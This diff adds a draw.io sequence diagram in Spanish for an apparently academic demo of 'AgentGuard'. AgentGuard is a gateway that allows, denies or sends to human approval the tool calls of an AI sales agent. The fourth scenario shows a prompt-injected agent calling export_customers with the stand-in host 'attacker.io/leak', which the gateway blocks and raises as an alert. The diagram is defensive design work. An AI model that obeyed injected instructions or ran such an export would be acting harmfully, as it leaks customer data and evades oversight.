@@ -1,0 +1,245 @@
+<mxfile host="app.diagrams.net" modified="2026-09-25T22:46:00.000Z" agent="AgentGuard-Architect" version="24.0.0" type="device">
+  <diagram id="secuencia-demo-4-escenarios" name="Secuencia Demo 4 Escenarios">
+    <mxGraphModel dx="1600" dy="1100" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="2400" pageHeight="1800" background="#f8fafc" math="0" shadow="0">
+      <root>
+        <mxCell id="0" />
+        <mxCell id="1" parent="0" />
+
+        <!-- ================= TOP HEADER BANNER ================= -->
+        <mxCell id="hdr_banner" value="" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#0f172a;strokeColor=#1e293b;shadow=1;" vertex="1" parent="1">
+          <mxGeometry x="40" y="30" width="2320" height="90" as="geometry" />
+        </mxCell>
+        <mxCell id="hdr_text" value="&lt;font color=&#39;#ffffff&#39; face=&#39;Helvetica&#39;&gt;&lt;b style=&#39;font-size:26px;&#39;&gt;🎬 AgentGuard — Diagrama de Secuencia de la Demo Principal (4 Escenarios Críticos)&lt;/b&gt;&lt;br&gt;&lt;span style=&#39;font-size:14px;color:#94a3b8;&#39;&gt;Demostración Integral en Vivo: Operación Permitida (ALLOW), Prohibida (DENY), Sensible (REQUIRE_APPROVAL) y Ataque de Prompt Injection&lt;/span&gt;&lt;/font&gt;" style="text;html=1;strokeColor=none;fillColor=none;align=left;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
+          <mxGeometry x="70" y="42" width="1650" height="66" as="geometry" />
+        </mxCell>
+        <mxCell id="hdr_badge" value="&lt;b&gt;DEMO ACADÉMICA&lt;/b&gt;&lt;br&gt;Sección 9 del Informe v2.0" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#1e293b;strokeColor=#f59e0b;fontColor=#fbbf24;fontSize=11;align=center;" vertex="1" parent="1">
+          <mxGeometry x="2100" y="45" width="220" height="60" as="geometry" />
+        </mxCell>
+
+        <!-- ================= LIFELINES (PARTICIPANTES UML) ================= -->
+        <!-- 1. Agente IA -->
+        <mxCell id="ll_agent" value="🤖 Agente IA&lt;br&gt;&lt;span style=&#39;font-size:10px;&#39;&gt;(Ventas / Claude)&lt;/span&gt;" style="shape=umlLifeline;perimeter=lifelinePerimeter;whiteSpace=wrap;html=1;container=1;collapsible=0;recursiveResize=0;outlineConnect=0;fillColor=#d1fae5;strokeColor=#059669;strokeWidth=2;fontColor=#1e293b;fontStyle=1;size=40;" vertex="1" parent="1">
+          <mxGeometry x="120" y="160" width="150" height="1550" as="geometry" />
+        </mxCell>
+
+        <!-- 2. Gateway PEP -->
+        <mxCell id="ll_gateway" value="🛡️ Gateway (PEP)&lt;br&gt;&lt;span style=&#39;font-size:10px;&#39;&gt;(Proxy Interceptor)&lt;/span&gt;" style="shape=umlLifeline;perimeter=lifelinePerimeter;whiteSpace=wrap;html=1;container=1;collapsible=0;recursiveResize=0;outlineConnect=0;fillColor=#e0f2fe;strokeColor=#0284c7;strokeWidth=2;fontColor=#1e293b;fontStyle=1;size=40;" vertex="1" parent="1">
+          <mxGeometry x="460" y="160" width="160" height="1550" as="geometry" />
+        </mxCell>
+
+        <!-- 3. Policy Engine PDP -->
+        <mxCell id="ll_pdp" value="⚖️ Policy Engine (PDP)&lt;br&gt;&lt;span style=&#39;font-size:10px;&#39;&gt;(Evaluador Determinista)&lt;/span&gt;" style="shape=umlLifeline;perimeter=lifelinePerimeter;whiteSpace=wrap;html=1;container=1;collapsible=0;recursiveResize=0;outlineConnect=0;fillColor=#ede9fe;strokeColor=#7c3aed;strokeWidth=2;fontColor=#1e293b;fontStyle=1;size=40;" vertex="1" parent="1">
+          <mxGeometry x="840" y="160" width="170" height="1550" as="geometry" />
+        </mxCell>
+
+        <!-- 4. Approver UI -->
+        <mxCell id="ll_approver" value="👤 Aprobador Humano&lt;br&gt;&lt;span style=&#39;font-size:10px;&#39;&gt;(Dashboard Web Inbox)&lt;/span&gt;" style="shape=umlLifeline;perimeter=lifelinePerimeter;whiteSpace=wrap;html=1;container=1;collapsible=0;recursiveResize=0;outlineConnect=0;fillColor=#ffe4e6;strokeColor=#be123c;strokeWidth=2;fontColor=#1e293b;fontStyle=1;size=40;" vertex="1" parent="1">
+          <mxGeometry x="1230" y="160" width="170" height="1550" as="geometry" />
+        </mxCell>
+
+        <!-- 5. External Tool / MCP Server -->
+        <mxCell id="ll_tool" value="🛠️ Servidor MCP / Tool&lt;br&gt;&lt;span style=&#39;font-size:10px;&#39;&gt;(CRM / Stripe / ERP)&lt;/span&gt;" style="shape=umlLifeline;perimeter=lifelinePerimeter;whiteSpace=wrap;html=1;container=1;collapsible=0;recursiveResize=0;outlineConnect=0;fillColor=#fef3c7;strokeColor=#d97706;strokeWidth=2;fontColor=#1e293b;fontStyle=1;size=40;" vertex="1" parent="1">
+          <mxGeometry x="1620" y="160" width="170" height="1550" as="geometry" />
+        </mxCell>
+
+        <!-- 6. Audit & Alert Service -->
+        <mxCell id="ll_audit" value="📜 Audit &amp;amp; Alert Service&lt;br&gt;&lt;span style=&#39;font-size:10px;&#39;&gt;(PostgreSQL DB + Logs)&lt;/span&gt;" style="shape=umlLifeline;perimeter=lifelinePerimeter;whiteSpace=wrap;html=1;container=1;collapsible=0;recursiveResize=0;outlineConnect=0;fillColor=#f1f5f9;strokeColor=#475569;strokeWidth=2;fontColor=#1e293b;fontStyle=1;size=40;" vertex="1" parent="1">
+          <mxGeometry x="2010" y="160" width="180" height="1550" as="geometry" />
+        </mxCell>
+
+
+        <!-- ================= ESCENARIO 1: OPERACIÓN NORMAL (ALLOW) ================= -->
+        <mxCell id="box_scen1" value="ESCENARIO 1: OPERACIÓN NORMAL (ALLOW) — Invocación legítima bajo el umbral permitido" style="shape=umlFrame;whiteSpace=wrap;html=1;width=650;height=30;fillColor=#f0fdf4;strokeColor=#16a34a;strokeWidth=2;fontColor=#15803d;fontStyle=1;align=left;spacingLeft=10;" vertex="1" parent="1">
+          <mxGeometry x="70" y="240" width="2180" height="280" as="geometry" />
+        </mxCell>
+
+        <mxCell id="msg_1_1" value="1. Tool Call: create_quote(customer_id: 104, amount: $2,500)" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#0284c7;strokeWidth=2;fontColor=#0284c7;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_agent" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <mxPoint x="200" y="290" as="sourcePoint" />
+            <mxPoint x="530" y="290" as="targetPoint" />
+            <Array as="points"><mxPoint x="360" y="290" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_1_2" value="2. Intercepta &amp; evalúa: [Agent: Sales, Action: create_quote, Amount: $2,500]" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#7c3aed;strokeWidth=2;fontColor=#7c3aed;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_pdp">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="720" y="325" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_1_3" value="3. Regla coincide: amount &lt; $10,000 &amp;rarr; DECISIÓN: ALLOW" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#16a34a;strokeWidth=2;fontColor=#16a34a;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_pdp" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="720" y="360" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_1_4" value="4. Enruta llamada protegida al Servidor MCP" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#16a34a;strokeWidth=2;fontColor=#16a34a;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_tool">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1100" y="395" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_1_5" value="5. Retorna: {quote_id: &#39;QT-991&#39;, status: &#39;created&#39;}" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#d97706;strokeWidth=2;fontColor=#b45309;fontSize=11;" edge="1" parent="1" source="ll_tool" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1100" y="430" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_1_6" value="6. Async: Guarda Execution Trace (ALLOW, 200 OK)" style="html=1;verticalAlign=bottom;endArrow=block;dashed=1;strokeColor=#475569;strokeWidth=1;fontColor=#475569;fontSize=10;" edge="1" parent="1" source="ll_gateway" target="ll_audit">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1300" y="460" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_1_7" value="7. Respuesta exitosa al Agente" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#16a34a;strokeWidth=2;fontColor=#16a34a;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_agent">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="360" y="480" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+
+        <!-- ================= ESCENARIO 2: OPERACIÓN PROHIBIDA (DENY) ================= -->
+        <mxCell id="box_scen2" value="ESCENARIO 2: OPERACIÓN PROHIBIDA (DENY) — Intento de abuso de privilegio (Privilege Escalation)" style="shape=umlFrame;whiteSpace=wrap;html=1;width=690;height=30;fillColor=#fef2f2;strokeColor=#dc2626;strokeWidth=2;fontColor=#b91c1c;fontStyle=1;align=left;spacingLeft=10;" vertex="1" parent="1">
+          <mxGeometry x="70" y="550" width="2180" height="260" as="geometry" />
+        </mxCell>
+
+        <mxCell id="msg_2_1" value="1. Tool Call: update_price(product_id: 88, new_price: $10)" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#dc2626;strokeWidth=2;fontColor=#dc2626;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_agent" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="360" y="600" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_2_2" value="2. Evalúa capacidad: Agente de ventas NO posee permisos de modificación de catálogo" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#7c3aed;strokeWidth=2;fontColor=#7c3aed;fontSize=11;" edge="1" parent="1" source="ll_gateway" target="ll_pdp">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="720" y="635" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_2_3" value="3. Regla explícita / Fail-Closed &amp;rarr; DECISIÓN: DENY (Forbidden Tool)" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#dc2626;strokeWidth=2;fontColor=#dc2626;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_pdp" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="720" y="670" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="note_never_reaches" value="🛡️ LA LLAMADA NUNCA ALCANZA EL SERVIDOR MCP DESTINO (ENFORCEMENT EXTERNO AL LLM)" style="shape=note;whiteSpace=wrap;html=1;size=14;verticalAlign=top;align=left;spacingTop=-6;fillColor=#fee2e2;strokeColor=#dc2626;fontColor=#991b1b;fontSize=10;fontStyle=1;" vertex="1" parent="1">
+          <mxGeometry x="1100" y="640" width="480" height="40" as="geometry" />
+        </mxCell>
+
+        <mxCell id="msg_2_4" value="4. Guarda Execution Trace (DENY: Unauthorized Action)" style="html=1;verticalAlign=bottom;endArrow=block;dashed=1;strokeColor=#475569;strokeWidth=1;fontColor=#475569;fontSize=10;" edge="1" parent="1" source="ll_gateway" target="ll_audit">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1300" y="720" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_2_5" value="5. Error 403 Forbidden: Agent lacks capability for &#39;update_price&#39;" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#dc2626;strokeWidth=2;fontColor=#dc2626;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_agent">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="360" y="750" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+
+        <!-- ================= ESCENARIO 3: OPERACIÓN SENSIBLE (REQUIRE_APPROVAL) ================= -->
+        <mxCell id="box_scen3" value="ESCENARIO 3: OPERACIÓN SENSIBLE (REQUIRE_APPROVAL) — Intervención Humana (Human-in-the-Loop)" style="shape=umlFrame;whiteSpace=wrap;html=1;width=750;height=30;fillColor=#fff1f2;strokeColor=#be123c;strokeWidth=2;fontColor=#9f1239;fontStyle=1;align=left;spacingLeft=10;" vertex="1" parent="1">
+          <mxGeometry x="70" y="840" width="2180" height="420" as="geometry" />
+        </mxCell>
+
+        <mxCell id="msg_3_1" value="1. Tool Call: refund(customer_id: 302, amount: $4,500)" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#be123c;strokeWidth=2;fontColor=#be123c;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_agent" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="360" y="890" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_3_2" value="2. Evalúa política de reembolsos [Monto: $4,500 &gt;= Umbral de $500]" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#7c3aed;strokeWidth=2;fontColor=#7c3aed;fontSize=11;" edge="1" parent="1" source="ll_gateway" target="ll_pdp">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="720" y="920" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_3_3" value="3. DECISIÓN: REQUIRE_APPROVAL (Monto superior al límite autónomo)" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#f59e0b;strokeWidth=2;fontColor=#b45309;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_pdp" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="720" y="950" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_3_4" value="4. Pausa llamada y emite evento WebSocket: Approval Pending #APR-77" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#be123c;strokeWidth=2;fontColor=#be123c;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_approver">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="920" y="985" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_3_5" value="5. Operador revisa en Dashboard y hace click en [APROBAR con motivo: &#39;Cliente VIP validado&#39;]" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#16a34a;strokeWidth=2;fontColor=#15803d;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_approver" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="920" y="1040" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_3_6" value="6. Reanuda llamada aprobada hacia Servidor MCP Stripe" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#16a34a;strokeWidth=2;fontColor=#16a34a;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_tool">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1100" y="1090" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_3_7" value="7. Respuesta de Stripe: {refund_id: &#39;re_38dfj&#39;, status: &#39;succeeded&#39;}" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#d97706;strokeWidth=2;fontColor=#b45309;fontSize=11;" edge="1" parent="1" source="ll_tool" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1100" y="1130" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_3_8" value="8. Guarda Execution Trace completo: PENDING &amp;rarr; APPROVED por User #12" style="html=1;verticalAlign=bottom;endArrow=block;dashed=1;strokeColor=#475569;strokeWidth=1;fontColor=#475569;fontSize=10;" edge="1" parent="1" source="ll_gateway" target="ll_audit">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1300" y="1170" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_3_9" value="9. Responde al Agente con la confirmación de la devolución" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#16a34a;strokeWidth=2;fontColor=#16a34a;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_agent">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="360" y="1210" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+
+        <!-- ================= ESCENARIO 4: PROMPT INJECTION & ALERTA ================= -->
+        <mxCell id="box_scen4" value="ESCENARIO 4: PROMPT INJECTION / EXFILTRACIÓN — Detección de Desvío de Propósito y Generación de Alerta Crítica" style="shape=umlFrame;whiteSpace=wrap;html=1;width=850;height=30;fillColor=#fef2f2;strokeColor=#991b1b;strokeWidth=2;fontColor=#7f1d1d;fontStyle=1;align=left;spacingLeft=10;" vertex="1" parent="1">
+          <mxGeometry x="70" y="1290" width="2180" height="360" as="geometry" />
+        </mxCell>
+
+        <mxCell id="msg_4_1" value="1. Agente manipulado por Prompt Injection emite: export_customers(destination: &#39;https://attacker.io/leak&#39;)" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#991b1b;strokeWidth=3;fontColor=#991b1b;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_agent" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="360" y="1340" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_4_2" value="2. Evalúa acción de alto impacto vs. propósito del agente y destino externo" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#7c3aed;strokeWidth=2;fontColor=#7c3aed;fontSize=11;" edge="1" parent="1" source="ll_gateway" target="ll_pdp">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="720" y="1375" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_4_3" value="3. Regla de seguridad: DENY export_customers WHEN destination is external &amp;rarr; DECISIÓN: DENY" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#dc2626;strokeWidth=2;fontColor=#dc2626;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_pdp" target="ll_gateway">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="720" y="1410" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_4_4" value="4. DISPARA ALERTA CRÍTICA: Intento de fuga de datos masiva por agente comprometido" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#b91c1c;strokeWidth=3;fontColor=#b91c1c;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_audit">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1300" y="1450" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_4_5" value="5. WebSocket Push: ALERTA ROJA en el Dashboard de los Administradores" style="html=1;verticalAlign=bottom;endArrow=block;rounded=0;strokeColor=#dc2626;strokeWidth=2;strokeDasharray=2 2;fontColor=#dc2626;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_audit" target="ll_approver">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="1600" y="1490" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+        <mxCell id="msg_4_6" value="6. Conexión cortada (403 Forbidden: Security Violation Logged)" style="html=1;verticalAlign=bottom;endArrow=open;dashed=1;endSize=8;rounded=0;strokeColor=#991b1b;strokeWidth=2;fontColor=#991b1b;fontSize=11;fontStyle=1;" edge="1" parent="1" source="ll_gateway" target="ll_agent">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points"><mxPoint x="360" y="1540" /></Array>
+          </mxGeometry>
+        </mxCell>
+
+      </root>
+    </mxGraphModel>
+  </diagram>
+</mxfile>
